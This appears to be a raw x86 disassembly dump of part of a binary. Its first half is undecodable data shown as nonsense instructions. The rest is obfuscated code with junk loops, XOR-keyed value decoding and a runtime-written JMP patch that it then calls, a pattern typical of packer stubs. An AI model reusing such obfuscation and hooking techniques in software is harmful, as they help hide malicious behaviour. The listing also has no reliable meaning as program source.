  422b1e:	jmp    0x7b02:0x37e10e4b
  422b25:	mov    dl,0x54
  422b27:	mov    eax,0x48c688a7
  422b2c:	mov    ch,0xe0
  422b2e:	std    
  422b2f:	mov    ebp,0x1c34e9c7
  422b34:	dec    ebp
  422b35:	mov    dh,0xeb
  422b37:	(bad)  
  422b38:	popa   
  422b39:	lds    esp,FWORD PTR ds:0x58867a2
  422b3f:	sbb    eax,0x5a31cee7
  422b44:	sar    bh,0x53
  422b47:	or     DWORD PTR [ecx+0x79],ebx
  422b4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b4b:	nop
  422b4c:	(bad)  
  422b4d:	jbe    0x422b47
  422b4f:	mov    ds:0x2bfed0b6,eax
  422b54:	das    
  422b55:	push   ebx
  422b56:	call   0x372d:0x65807cf1
  422b5d:	pop    DWORD PTR [edi+0x2b]
  422b60:	aas    
  422b61:	mov    cl,0x66
  422b63:	adc    edx,ebp
  422b65:	sbb    eax,0xa5b57e1a
  422b6a:	imul   esp,DWORD PTR ds:0x230958c7,0x33
  422b71:	daa    
  422b72:	mov    ebp,0xaeee3592
  422b77:	cmc    
  422b78:	rol    DWORD PTR ds:0x296c2799,0x1e
  422b7f:	pop    ecx
  422b80:	sbb    esp,DWORD PTR [edi+0x34]
  422b83:	inc    esp
  422b84:	xchg   ebx,eax
  422b85:	iret   
  422b86:	fdivp  st(4),st
  422b88:	jge    0x422b2a
  422b8a:	in     al,dx
  422b8b:	mov    ch,0xe
  422b8d:	xor    ecx,DWORD PTR [edx-0x12]
  422b90:	inc    edx
  422b91:	push   ebp
  422b92:	and    eax,0x7c92cd6f
  422b97:	jnp    0x422b1d
  422b99:	dec    edx
  422b9a:	push   ebp
  422b9b:	fsubr  QWORD PTR [edx+esi*8]
  422b9e:	ds aam 0x91
  422ba1:	es jo  0x422b94
  422ba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ba5:	shl    DWORD PTR [eax-0x66ed4895],1
  422bab:	and    BYTE PTR [esi],0x89
  422bae:	xor    edx,edi
  422bb0:	js     0x422b70
  422bb2:	pop    ss
  422bb3:	xor    BYTE PTR [eax+eax*2],bh
  422bb6:	sbb    esi,DWORD PTR [ecx]
  422bb8:	scas   al,BYTE PTR es:[edi]
  422bb9:	(bad)  
  422bba:	in     eax,0xd
  422bbc:	mov    dh,0xec
  422bbe:	in     al,0xe
  422bc0:	loop   0x422c0c
  422bc2:	(bad)  
  422bc3:	push   ebp
  422bc4:	mov    ebp,0xff6e0d6b
  422bc9:	jmp    0x33d68d6d
  422bce:	les    edi,FWORD PTR [ebp-0x12]
  422bd1:	(bad)  
  422bd2:	loop   0x422bcf
  422bd4:	xchg   edx,eax
  422bd5:	fisubr DWORD PTR [eax+ebp*8+0x15]
  422bd9:	pop    ebx
  422bda:	inc    edi
  422bdb:	(bad)  
  422bdc:	push   esi
  422bdd:	sahf   
  422bde:	(bad)  
  422be0:	imul   ebx,DWORD PTR [edx],0xffffffb2
  422be3:	hlt    
  422be4:	int    0x9e
  422be6:	dec    esi
  422be7:	scas   al,BYTE PTR es:[edi]
  422be8:	dec    ebp
  422be9:	inc    ebp
  422bea:	dec    ebp
  422beb:	mov    dh,BYTE PTR [ebp-0x17]
  422bee:	and    eax,0xbebf9ef0
  422bf3:	pop    es
  422bf4:	dec    ebx
  422bf5:	add    cl,BYTE PTR [edi+0x17]
  422bf8:	fdiv   st(1),st
  422bfa:	pop    edx
  422bfb:	xchg   ebx,eax
  422bfc:	sub    ebx,ebx
  422bfe:	push   es
  422bff:	dec    esp
  422c00:	or     edx,DWORD PTR [ebx+0x6e5003ff]
  422c06:	pop    ss
  422c07:	add    DWORD PTR [ecx-0x3d],0x77
  422c0b:	out    dx,al
  422c0c:	iret   
  422c0d:	cli    
  422c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c0f:	pop    ss
  422c10:	in     eax,0xaa
  422c12:	adc    ebx,DWORD PTR [esi+eax*2]
  422c15:	(bad)  
  422c16:	ss dec esp
  422c18:	stos   BYTE PTR es:[edi],al
  422c19:	push   esp
  422c1a:	xor    DWORD PTR [ecx-0x73],ecx
  422c1d:	jl     0x422c85
  422c1f:	mov    ds:0x533fb953,al
  422c24:	addr16 loop 0x422c21
  422c27:	xor    bl,dl
  422c29:	jecxz  0x422bf3
  422c2b:	sbb    DWORD PTR [edi+0x18],esi
  422c2e:	push   es
  422c2f:	fild   DWORD PTR [esi]
  422c31:	sub    ah,BYTE PTR [ecx-0xd3989fa]
  422c37:	dec    eax
  422c38:	retf   0xd9a1
  422c3b:	xor    esi,DWORD PTR [si-0x27e4]
  422c40:	inc    esi
  422c41:	stc    
  422c42:	imul   eax,DWORD PTR [ebp+0x4],0x2e
  422c46:	icebp  
  422c47:	es dec esi
  422c49:	hlt    
  422c4a:	push   es
  422c4b:	pop    ss
  422c4c:	pushf  
  422c4d:	xchg   esp,eax
  422c4e:	data16 adc al,0x89
  422c51:	xor    dl,BYTE PTR [edx+0x4d]
  422c54:	fs inc ax
  422c57:	fisub  DWORD PTR [eax+0x6529b745]
  422c5d:	fcom   DWORD PTR [eax]
  422c5f:	and    esi,DWORD PTR [esi+0x5b]
  422c62:	inc    eax
  422c63:	mov    ch,BYTE PTR [edi]
  422c65:	neg    BYTE PTR [ebp-0x69]
  422c68:	nop
  422c69:	retf   
  422c6a:	imul   edi,esi,0xc1b35431
  422c70:	dec    esp
  422c71:	test   ebx,ecx
  422c73:	pop    ecx
  422c74:	cwde   
  422c75:	inc    edi
  422c76:	ret    
  422c77:	je     0x422cbc
  422c79:	(bad)  
  422c7a:	out    0xa6,eax
  422c7c:	or     DWORD PTR fs:[ecx+0x38bec369],ecx
  422c83:	mov    edi,DWORD PTR [ecx]
  422c85:	xchg   ebx,ebx
  422c87:	js     0x422cd0
  422c89:	clts   
  422c8b:	mov    BYTE PTR [eax-0x3ac83b2b],ah
  422c91:	data16 fadd QWORD PTR [ecx-0x735fdb22]
  422c98:	and    ah,0x47
  422c9b:	fwait
  422c9c:	pop    eax
  422c9d:	or     al,0x8b
  422c9f:	mov    edi,0xf4977540
  422ca4:	int    0xde
  422ca6:	sub    al,0x1f
  422ca8:	jo     0x422cb2
  422caa:	daa    
  422cab:	xchg   BYTE PTR [ebp-0x4e0b39f2],al
  422cb1:	cld    
  422cb2:	std    
  422cb3:	shl    DWORD PTR [ebx],1
  422cb5:	mov    esi,ebp
  422cb7:	xchg   ebx,eax
  422cb8:	push   ebx
  422cb9:	call   0x4fce:0x5db10418
  422cc0:	rol    BYTE PTR [edx-0x43c02b9e],cl
  422cc6:	ja     0x422cba
  422cc8:	or     DWORD PTR [esp+edx*4],ecx
  422ccb:	xchg   ecx,eax
  422ccc:	xchg   esi,eax
  422ccd:	mov    cl,0xf
  422ccf:	pop    ds
  422cd0:	adc    DWORD PTR [edx+0x7b],esi
  422cd3:	adc    dl,BYTE PTR [esi+0x4cc571c8]
  422cd9:	mov    cl,0x97
  422cdb:	cmp    al,0x97
  422cdd:	ror    DWORD PTR [ecx],cl
  422cdf:	or     cl,BYTE PTR [eax+0x6c]
  422ce2:	cmp    al,0xca
  422ce4:	hlt    
  422ce5:	scas   eax,DWORD PTR es:[edi]
  422ce6:	scas   al,BYTE PTR es:[edi]
  422ce7:	popf   
  422ce8:	push   ebx
  422ce9:	clc    
  422cea:	ja     0x422d21
  422cec:	or     bh,ah
  422cee:	repnz inc esp
  422cf0:	jg     0x422cde
  422cf2:	mov    al,ds:0x19d2a5fa
  422cf7:	(bad)  
  422cf8:	adc    al,0xc7
  422cfa:	js     0x422cbe
  422cfc:	add    bh,BYTE PTR [eax-0x3457327]
  422d02:	(bad)  
  422d03:	adc    BYTE PTR [ebx+esi*4],dl
  422d06:	lea    edx,[edi]
  422d08:	cwde   
  422d09:	jg     0x422ccc
  422d0b:	xchg   edx,eax
  422d0c:	ror    BYTE PTR [esi+edi*8],1
  422d0f:	inc    esi
  422d10:	repz pop ds
  422d12:	mov    eax,ds:0xde07e62
  422d17:	cmp    ah,BYTE PTR [esi+0x2398e932]
  422d1d:	scas   al,BYTE PTR es:[edi]
  422d1e:	jns    0x422d27
  422d20:	xor    al,0xf6
  422d22:	in     eax,0xa4
  422d24:	and    al,0xec
  422d26:	aad    0xb1
  422d28:	mov    al,0x95
  422d2a:	jge    0x422d0d
  422d2c:	xchg   esp,eax
  422d2d:	dec    ebx
  422d2e:	lahf   
  422d2f:	dec    ecx
  422d30:	stc    
  422d31:	add    al,0xfe
  422d33:	repnz xor DWORD PTR [ecx],edx
  422d36:	or     dh,ah
  422d38:	leave  
  422d39:	push   ebp
  422d3a:	retf   0xe5ce
  422d3d:	adc    eax,0xf83f685b
  422d42:	jle    0x422d64
  422d44:	sar    ebp,cl
  422d46:	and    DWORD PTR [edi+0x2c],0x82df7572
  422d4d:	push   edx
  422d4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d4f:	pop    esp
  422d50:	push   edx
  422d51:	push   es
  422d52:	fbld   TBYTE PTR [ebx-0x542a24fa]
  422d58:	clc    
  422d59:	ds in  al,dx
  422d5b:	je     0x422d4e
  422d5d:	pushf  
  422d5e:	jns    0x422dd7
  422d60:	pop    DWORD PTR [ecx]
  422d62:	cmc    
  422d63:	pop    edi
  422d64:	ja     0x422d51
  422d66:	sub    eax,0xf4aa2ebc
  422d6b:	call   0xc7542965
  422d70:	jp     0x422cfe
  422d72:	in     al,0x7c
  422d74:	lock aaa 
  422d76:	arpl   bp,dx
  422d78:	lock fst QWORD PTR [ecx-0x492536ad]
  422d7f:	xchg   edx,eax
  422d80:	scas   al,BYTE PTR es:[edi]
  422d81:	mov    DWORD PTR [eax+0x4a],ebp
  422d84:	mov    DWORD PTR ds:0x6a3c6355,ebx
  422d8a:	cmp    al,0xcd
  422d8c:	dec    ebx
  422d8d:	dec    esi
  422d8e:	enter  0x5bb0,0x1b
  422d92:	adc    DWORD PTR [ebp+0x2f],0x51
  422d96:	push   es
  422d97:	mov    DWORD PTR [ecx],ebp
  422d99:	es test ecx,ebp
  422d9c:	mov    bl,0xc6
  422d9e:	ja     0x422d59
  422da0:	(bad)
  422da4:	inc    ebx
  422da5:	jmp    0x2d4410dd
  422daa:	shl    BYTE PTR [esi-0x2117e987],cl
  422db0:	push   0xffffffe2
  422db2:	xor    ecx,DWORD PTR [esp+ebp*8+0x1ebe4fbb]
  422db9:	(bad)  
  422dba:	das    
  422dbb:	inc    ecx
  422dbc:	add    edx,DWORD PTR [eax+ecx*4]
  422dbf:	dec    edx
  422dc0:	out    0xed,eax
  422dc2:	xlat   BYTE PTR ds:[ebx]
  422dc3:	fs mov bh,0xf7
  422dc6:	mov    edi,0x9a3040a2
  422dcb:	scas   eax,DWORD PTR es:[edi]
  422dcc:	cld    
  422dcd:	(bad)  
  422dcf:	sbb    esi,esi
  422dd1:	push   0xffffffc1
  422dd3:	in     al,dx
  422dd4:	lds    ecx,FWORD PTR [ebp-0xf]
  422dd7:	scas   eax,DWORD PTR es:[edi]
  422dd8:	fisub  WORD PTR [ecx]
  422dda:	sub    al,0x58
  422ddc:	lods   al,BYTE PTR ds:[esi]
  422ddd:	lock pop esp
  422ddf:	xchg   BYTE PTR [ecx+0x4d849704],bh
  422de5:	push   ds
  422de6:	push   es
  422de7:	dec    ebx
  422de8:	inc    edi
  422de9:	(bad)  
  422dea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422deb:	or     BYTE PTR [eax+eiz*2+0x45],cl
  422def:	lods   eax,DWORD PTR ds:[esi]
  422df0:	lods   eax,DWORD PTR ds:[esi]
  422df1:	add    eax,0x8819a0f2
  422df6:	dec    esi
  422df7:	les    ebx,FWORD PTR [ebp-0x47]
  422dfa:	or     ecx,esp
  422dfc:	jno    0x422dc3
  422dfe:	push   0x71ca4fd9
  422e03:	jge    0x422e68
  422e05:	and    al,0x6b
  422e07:	les    eax,FWORD PTR [esi+0x4d6c9d75]
  422e0d:	mov    ebx,0xd6c7f775
  422e12:	jmp    0x1dc9:0xb0022924
  422e19:	je     0x422ddf
  422e1b:	out    dx,al
  422e1c:	shl    DWORD PTR [ebx+ecx*1+0x48],0x86
  422e21:	lock rol bh,cl
  422e24:	outs   dx,DWORD PTR ds:[esi]
  422e25:	xchg   edx,eax
  422e26:	sbb    eax,0xa266cfa7
  422e2b:	mov    ah,0xf1
  422e2d:	ins    BYTE PTR es:[edi],dx
  422e2e:	jb     0x422e31
  422e30:	repz cmp al,0xbe
  422e33:	or     BYTE PTR [ebp-0x330b71c3],bl
  422e39:	sahf   
  422e3a:	mov    al,0x2b
  422e3c:	pop    ebp
  422e3d:	ret    
  422e3e:	xchg   ecx,eax
  422e3f:	ret    
  422e40:	sub    BYTE PTR [eax-0x71],0x39
  422e44:	out    0x84,al
  422e46:	push   ebp
  422e47:	js     0x422e27
  422e49:	scas   eax,DWORD PTR es:[edi]
  422e4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e4b:	push   esp
  422e4c:	shl    BYTE PTR [edx-0x6a5209d1],0xda
  422e53:	and    DWORD PTR [eax],ebp
  422e55:	ret    
  422e56:	dec    ebx
  422e57:	and    al,0x5f
  422e59:	aaa    
  422e5a:	nop
  422e5b:	clc    
  422e5c:	pop    ecx
  422e5d:	sbb    al,0xaf
  422e5f:	sbb    al,0x8
  422e61:	mov    ebx,0xa32b8973
  422e66:	mov    dh,0x23
  422e68:	pop    eax
  422e69:	fwait
  422e6a:	dec    eax
  422e6b:	jmp    0x86f15108
  422e70:	dec    ecx
  422e71:	sbb    al,0x72
  422e73:	cmp    BYTE PTR [esi-0x418e98a9],dl
  422e79:	or     eax,DWORD PTR [ecx*2+0x53d92b0c]
  422e80:	lock fwait
  422e82:	cdq    
  422e83:	retf   0x3317
  422e86:	(bad)  
  422e87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e88:	adc    ebp,ecx
  422e8a:	mov    ?,WORD PTR [ebp+0x62d87f16]
  422e90:	jge    0x422ef7
  422e92:	mov    cl,0xda
  422e94:	in     eax,0x1f
  422e96:	(bad)  [edi-0x1ecf0a82]
  422e9c:	aas    
  422e9d:	dec    ebx
  422e9e:	cli    
  422e9f:	push   esp
  422ea0:	sbb    DWORD PTR [esi-0x1faec0a6],eax
  422ea6:	mov    bh,0xee
  422ea8:	shl    dl,1
  422eaa:	mov    WORD PTR [esi],ds
  422eac:	xchg   DWORD PTR [esi],eax
  422eae:	ins    BYTE PTR es:[edi],dx
  422eaf:	stos   DWORD PTR es:[edi],eax
  422eb0:	mov    al,0x3f
  422eb2:	mov    BYTE PTR [ebp+0xaa90931],ah
  422eb8:	add    ebp,DWORD PTR [edi-0x73460e32]
  422ebe:	xchg   esp,eax
  422ebf:	xchg   esp,eax
  422ec0:	aam    0x64
  422ec2:	lea    ebx,[ecx+0x4b0ec993]
  422ec8:	inc    ebx
  422ec9:	and    eax,0x712e927b
  422ece:	arpl   WORD PTR ds:0xbad96cdf,di
  422ed4:	add    DWORD PTR [esi],ebp
  422ed6:	or     al,BYTE PTR [ebp+0x264d7835]
  422edc:	or     edi,DWORD PTR [ebx+0x5]
  422edf:	pushf  
  422ee0:	fdiv   DWORD PTR [edi+eax*1+0x21d67c0d]
  422ee7:	das    
  422ee8:	pop    ecx
  422ee9:	lods   eax,DWORD PTR ds:[esi]
  422eea:	aam    0xdc
  422eec:	mov    ebp,0x9769565d
  422ef1:	xor    al,0xb7
  422ef3:	std    
  422ef4:	loopne 0x422ebc
  422ef6:	mov    ecx,edx
  422ef8:	mov    WORD PTR [esi-0x3a72ad82],fs
  422efe:	pop    esi
  422eff:	pop    ebx
  422f00:	mov    ebx,0x3c33021b
  422f05:	jae    0x422f01
  422f07:	out    dx,al
  422f08:	scas   al,BYTE PTR es:[edi]
  422f09:	or     DWORD PTR [esi-0x207499f1],0xfffffffe
  422f10:	xor    cl,cl
  422f12:	push   es
  422f13:	nop
  422f14:	lahf   
  422f15:	or     bh,BYTE PTR [eax-0x28ee9d19]
  422f1b:	(bad)  
  422f1c:	std    
  422f1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f1e:	lds    ecx,FWORD PTR [esi+esi*4]
  422f21:	inc    esp
  422f22:	imul   edx,DWORD PTR [ebx-0x4b147f5],0x36
  422f29:	out    dx,al
  422f2a:	push   ss
  422f2b:	imul   esp,DWORD PTR [eax-0x45192662],0xffffffda
  422f32:	mov    es,WORD PTR [edi+0x63]
  422f35:	push   0xffffffe9
  422f37:	push   edi
  422f38:	cmp    dh,cl
  422f3a:	sub    DWORD PTR [eax+0x35c1df0a],ebp
  422f40:	jmp    0x422f93
  422f42:	push   es
  422f43:	cmc    
  422f44:	test   DWORD PTR [edx-0x2f],ebp
  422f47:	je     0x422f76
  422f49:	imul   eax,DWORD PTR [ecx-0x7a0f0bb3],0xf70bf89c
  422f53:	mov    eax,DWORD PTR [ebp-0x1c]
  422f56:	and    DWORD PTR ds:0x42d01c,0x0
  422f60:	mov    edi,DWORD PTR ds:0x42d01c
  422f66:	inc    edi
  422f67:	mov    DWORD PTR ds:0x42d01c,edi
  422f6d:	cmp    DWORD PTR ds:0x42d01c,0x21
  422f74:	jle    0x422f9a
  422f7a:	jmp    0x422f8d
  422f7f:	push   DWORD PTR [ebp-0xc]
  422f82:	push   0x261c
  422f87:	call   DWORD PTR ds:0x43002b
  422f8d:	cmp    DWORD PTR ds:0x42d01c,0x1f
  422f94:	jb     0x422f60
  422f9a:	mov    ecx,DWORD PTR [ebp-0x1c]
  422f9d:	movzx  edi,WORD PTR ds:0x42901c
  422fa4:	adc    DWORD PTR ds:0x42c010,edi
  422faa:	sub    eax,ecx
  422fac:	xor    esi,esi
  422fae:	xor    esi,DWORD PTR ds:0x42d004
  422fb4:	sub    DWORD PTR ds:0x42c01c,esi
  422fba:	mov    DWORD PTR [ebp-0x1c],eax
  422fbd:	mov    DWORD PTR ds:0x42c00c,0x19
  422fc7:	cmp    DWORD PTR ds:0x42c00c,0x0
  422fce:	je     0x423021
  422fd4:	cmp    DWORD PTR ds:0x42c00c,0x3
  422fdb:	jb     0x423021
  422fe1:	jmp    0x422ff9
  422fe6:	push   DWORD PTR [ebp-0x1c]
  422fe9:	push   0x42d010
  422fee:	push   0x42f0a7
  422ff3:	call   DWORD PTR ds:0x430033
  422ff9:	cmp    DWORD PTR ds:0x42c00c,0x4
  423000:	jne    0x423011
  423006:	mov    eax,ds:0x42c00c
  42300b:	dec    eax
  42300c:	mov    ds:0x42c00c,eax
  423011:	mov    eax,ds:0x42c00c
  423016:	dec    eax
  423017:	mov    ds:0x42c00c,eax
  42301c:	jmp    0x422fc7
  423021:	or     DWORD PTR [ebp-0x1c],0xf89c8590
  423028:	mov    eax,DWORD PTR [ebp-0x20]
  42302b:	and    DWORD PTR ds:0x429000,edx
  423031:	mov    ecx,DWORD PTR [ebp-0x20]
  423034:	mov    edi,DWORD PTR ds:0x42a004
  42303a:	sub    edi,DWORD PTR ds:0x42c01c
  423040:	mov    DWORD PTR ds:0x42a004,edi
  423046:	sub    eax,ecx
  423048:	mov    DWORD PTR [ebp-0x20],eax
  42304b:	mov    eax,DWORD PTR [ebp-0x2c]
  42304e:	sbb    DWORD PTR ds:0x42b018,edx
  423054:	mov    ecx,DWORD PTR [ebp-0x20]
  423057:	or     DWORD PTR ds:0x42d008,ecx
  42305d:	mov    esi,0x75108a4
  423062:	xor    eax,esi
  423064:	mov    DWORD PTR ds:0x42c01c,0x12
  42306e:	cmp    DWORD PTR ds:0x42c01c,0x0
  423075:	je     0x4230c7
  42307b:	cmp    DWORD PTR ds:0x42c01c,0x7
  423082:	ja     0x4230c7
  423088:	jmp    0x423099
  42308d:	push   DWORD PTR [ebp-0x1c]
  423090:	push   DWORD PTR [ebp-0x20]
  423093:	call   DWORD PTR ds:0x430037
  423099:	cmp    DWORD PTR ds:0x42c01c,0x8
  4230a0:	jne    0x4230b3
  4230a6:	mov    edi,DWORD PTR ds:0x42c01c
  4230ac:	dec    edi
  4230ad:	mov    DWORD PTR ds:0x42c01c,edi
  4230b3:	xor    edi,edi
  4230b5:	xor    edi,DWORD PTR ds:0x42c01c
  4230bb:	dec    edi
  4230bc:	mov    DWORD PTR ds:0x42c01c,edi
  4230c2:	jmp    0x42306e
  4230c7:	mov    edi,0x3272ec
  4230cc:	add    eax,edi
  4230ce:	or     eax,ecx
  4230d0:	mov    DWORD PTR [ebp-0x20],eax
  4230d3:	mov    eax,DWORD PTR [ebp-0x4]
  4230d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4230d9:	sub    eax,ecx
  4230db:	mov    DWORD PTR [ebp-0x4],eax
  4230de:	or     DWORD PTR [ebp-0x4],0xf89c85bd
  4230e5:	mov    eax,DWORD PTR [ebp-0xc]
  4230e8:	xor    eax,esi
  4230ea:	add    eax,edi
  4230ec:	push   eax
  4230ed:	mov    eax,DWORD PTR [ebp-0x10]
  4230f0:	xor    eax,esi
  4230f2:	add    eax,edi
  4230f4:	push   eax
  4230f5:	mov    eax,DWORD PTR [ebp-0x4]
  4230f8:	xor    eax,esi
  4230fa:	add    eax,edi
  4230fc:	push   eax
  4230fd:	lea    eax,[ebp-0x7c]
  423100:	push   eax
  423101:	push   DWORD PTR [ebp-0x2c]
  423104:	push   DWORD PTR [ebp-0x28]
  423107:	call   0x416118
  42310c:	test   eax,eax
  42310e:	je     0x42313c
  423114:	lea    eax,[ebp-0x7c]
  423117:	push   eax
  423118:	mov    eax,DWORD PTR [ebp-0x28]
  42311b:	xor    eax,esi
  42311d:	add    eax,edi
  42311f:	push   eax
  423120:	mov    eax,DWORD PTR [ebp-0x24]
  423123:	add    eax,0xaa
  423128:	push   eax
  423129:	mov    eax,DWORD PTR [ebp-0x24]
  42312c:	mov    eax,DWORD PTR [eax+0x198]
  423132:	push   DWORD PTR [eax]
  423134:	call   0x40cc14
  423139:	mov    DWORD PTR [ebp-0x14],eax
  42313c:	lea    eax,[ebp+0x4]
  42313f:	mov    DWORD PTR [ebp-0x30],eax
  423142:	mov    eax,DWORD PTR [ebp-0x14]
  423145:	test   eax,eax
  423147:	je     0x4231af
  42314d:	lea    eax,[ebp-0x8]
  423150:	mov    DWORD PTR [ebp-0x38],eax
  423153:	mov    eax,DWORD PTR [ebp-0x34]
  423156:	mov    DWORD PTR [ebp-0x8],eax
  423159:	mov    eax,DWORD PTR [ebp-0x8]
  42315c:	mov    ecx,DWORD PTR [ebp-0x14]
  42315f:	sub    eax,ecx
  423161:	mov    DWORD PTR [ebp-0x8],eax
  423164:	mov    ecx,DWORD PTR [ebp-0x4]
  423167:	xor    ecx,esi
  423169:	mov    eax,0xffcd8d14
  42316e:	sub    eax,ecx
  423170:	add    DWORD PTR [ebp-0x8],eax
  423173:	mov    eax,DWORD PTR [ebp-0x8]
  423176:	mov    ecx,DWORD PTR [ebp-0x14]
  423179:	mov    DWORD PTR [ecx+0x1],eax
  42317c:	mov    eax,DWORD PTR [ebp-0x14]
  42317f:	push   DWORD PTR [ebp-0x24]
  423182:	mov    BYTE PTR [eax],0xe9
  423185:	mov    eax,ds:0x42f1e7
  42318a:	push   DWORD PTR [eax]
  42318c:	push   DWORD PTR ds:0x42f443
  423192:	push   DWORD PTR ds:0x42f1ef
  423198:	push   DWORD PTR ds:0x42f423
  42319e:	push   DWORD PTR ds:0x42fe03
  4231a4:	push   DWORD PTR [ebp-0x28]
  4231a7:	push   DWORD PTR [ebp-0x2c]
  4231aa:	mov    eax,DWORD PTR [ebp-0x14]
  4231ad:	call   eax
  4231af:	mov    eax,DWORD PTR [ebp-0x30]
  4231b2:	mov    ecx,DWORD PTR ds:0x42f3e7
  4231b8:	add    DWORD PTR [eax],ecx
  4231ba:	pop    edi
  4231bb:	pop    esi
  4231bc:	leave  
  4231bd:	ret    
  4231be:	push   ebp
  4231bf:	mov    ebp,esp
  4231c1:	sub    esp,0x18
  4231c4:	add    ecx,0x1177
  4231ca:	mov    DWORD PTR [ebp-0x10],0xf89f85b0
  4231d1:	lea    eax,[ebp+0x14]
  4231d4:	mov    DWORD PTR [ebp-0x4],eax
  4231d7:	xor    edx,edx
  4231d9:	add    edx,DWORD PTR ds:0x42a01c
  4231df:	add    DWORD PTR ds:0x42a018,edx
  4231e5:	push   esi
  4231e6:	mov    esi,0xf89c85b0
  4231eb:	mov    DWORD PTR [ebp-0xc],esi
  4231ee:	movzx  ecx,BYTE PTR ds:0x42c004
  4231f5:	add    DWORD PTR ds:0x42a008,ecx
  4231fb:	lea    eax,[ebp-0xc]
  4231fe:	or     ecx,0x71b1
  423204:	mov    DWORD PTR [ebp-0x14],eax
  423207:	mov    eax,DWORD PTR [ebp-0xc]
  42320a:	and    edx,DWORD PTR ds:0x42c008
  423210:	mov    edx,DWORD PTR [ebp-0x14]
  423213:	sbb    DWORD PTR ds:0x42b014,edi
  423219:	mov    ecx,0x75108a4
  42321e:	adc    DWORD PTR ds:0x42d008,0x42fa
  423228:	xor    eax,ecx
  42322a:	sub    DWORD PTR ds:0x42a014,0x42d00c
  423234:	add    eax,0x3272ec
  423239:	mov    DWORD PTR [edx],eax
  42323b:	adc    edx,eax
  42323d:	mov    eax,ds:0x42f1e3
  423242:	mov    edx,DWORD PTR [ebp-0x4]
  423245:	mov    eax,DWORD PTR [eax]
  423247:	sbb    DWORD PTR ds:0x42d000,0x2503
  423251:	add    eax,DWORD PTR [edx]
  423253:	movzx  edx,BYTE PTR ds:0x42b00c
  42325a:	add    edx,DWORD PTR ds:0x42b01c
  423260:	mov    DWORD PTR ds:0x42b00c,edx
  423266:	push   edi
  423267:	mov    DWORD PTR ds:0x42901c,0x390b
  423271:	mov    DWORD PTR [ebp-0x8],eax
  423274:	and    edi,edx
  423276:	mov    edi,DWORD PTR [ebp+0x8]
  423279:	adc    eax,eax
  42327b:	mov    eax,ds:0x42f36b
  423280:	mov    eax,DWORD PTR [eax+0x198]
  423286:	and    DWORD PTR ds:0x42c000,0x0
  423290:	mov    edx,DWORD PTR ds:0x42c000
  423296:	inc    edx
  423297:	mov    DWORD PTR ds:0x42c000,edx
  42329d:	cmp    DWORD PTR ds:0x42c000,0x20
  4232a4:	jb     0x4232ce
  4232aa:	jmp    0x4232c1
  4232af:	push   0x42f169
  4232b4:	push   0x0
  4232b6:	push   0x64f9
  4232bb:	call   DWORD PTR ds:0x43003b
  4232c1:	cmp    DWORD PTR ds:0x42c000,0x15
  4232c8:	jb     0x423290
  4232ce:	xor    edi,ecx
  4232d0:	mov    edx,DWORD PTR ds:0x42c01c
  4232d6:	add    DWORD PTR ds:0x42d00c,edx
  4232dc:	mov    edx,0x3272ec
  4232e1:	adc    DWORD PTR ds:0x42d00c,0x354a
  4232eb:	add    edi,edx
  4232ed:	cmp    DWORD PTR [eax],edi
  4232ef:	mov    DWORD PTR ds:0x42c018,0xd0b
  4232f9:	je     0x423310
  4232ff:	mov    eax,DWORD PTR [eax]
  423301:	mov    DWORD PTR ds:0x42a010,0x6032
  42330b:	jmp    0x4236c0
  423310:	mov    eax,DWORD PTR [ebp+0x18]
  423313:	mov    DWORD PTR ds:0x42d008,0x3f3a
  42331d:	cmp    eax,esi
  42331f:	jne    0x423339
  423325:	push   0xf89c85b1
  42332a:	mov    DWORD PTR ds:0x429004,0x3d8f
  423334:	jmp    0x4236af
  423339:	mov    esi,DWORD PTR [ebp+0x18]
  42333c:	mov    eax,0xf89c85b2
  423341:	mov    DWORD PTR ds:0x42d00c,0x2c1e
  42334b:	cmp    esi,eax
  42334d:	mov    DWORD PTR ds:0x429008,0x446d
  423357:	jne    0x42369f
  42335d:	mov    eax,DWORD PTR [ebp+0x10]
  423360:	xor    DWORD PTR ds:0x42d000,0x2610
  42336a:	xor    eax,ecx
  42336c:	add    eax,edx
  42336e:	and    DWORD PTR ds:0x42c014,0x0
  423378:	jmp    0x42338a
  42337d:	mov    esi,DWORD PTR ds:0x42c014
  423383:	inc    esi
  423384:	mov    DWORD PTR ds:0x42c014,esi
  42338a:	cmp    DWORD PTR ds:0x42c014,0x17
  423391:	jae    0x4233b9
  423397:	cmp    DWORD PTR ds:0x42c014,0x1d
  42339e:	ja     0x4233b9
  4233a4:	jmp    0x4233b4
  4233a9:	push   0x54c4
  4233ae:	call   DWORD PTR ds:0x43003f
  4233b4:	jmp    0x42337d
  4233b9:	mov    DWORD PTR [ebp-0x18],eax
  4233bc:	mov    eax,DWORD PTR [ebp+0xc]
  4233bf:	add    DWORD PTR ds:0x42a004,0x5855
  4233c9:	mov    esi,DWORD PTR [ebp-0x8]
  4233cc:	and    DWORD PTR ds:0x42c018,0x829
  4233d6:	xor    eax,ecx
  4233d8:	adc    DWORD PTR ds:0x42d000,0x54e9
  4233e2:	add    eax,edx
  4233e4:	imul   eax,DWORD PTR [esi]
  4233e7:	mov    esi,DWORD PTR [ebp+0x8]
  4233ea:	xor    esi,ecx
  4233ec:	and    DWORD PTR ds:0x42b014,0x42901c
  4233f6:	add    esi,edx
  4233f8:	cmp    esi,eax
  4233fa:	not    DWORD PTR ds:0x42d018
  423400:	mov    eax,DWORD PTR [ebp-0x4]
  423403:	mov    DWORD PTR ds:0x42d00c,0x5bdb
  42340d:	push   ebx
  42340e:	mov    DWORD PTR ds:0x429014,0x4e26
  423418:	je     0x423461
  42341e:	adc    DWORD PTR ds:0x42b014,ecx
  423424:	mov    esi,DWORD PTR [ebp-0x18]
  423427:	add    DWORD PTR [eax],esi
  423429:	sub    DWORD PTR ds:0x429018,edi
  42342f:	mov    eax,DWORD PTR [ebp-0x4]
  423432:	and    DWORD PTR ds:0x429014,0x244e
  42343c:	mov    esi,DWORD PTR [ebp+0xc]
  42343f:	xor    esi,ecx
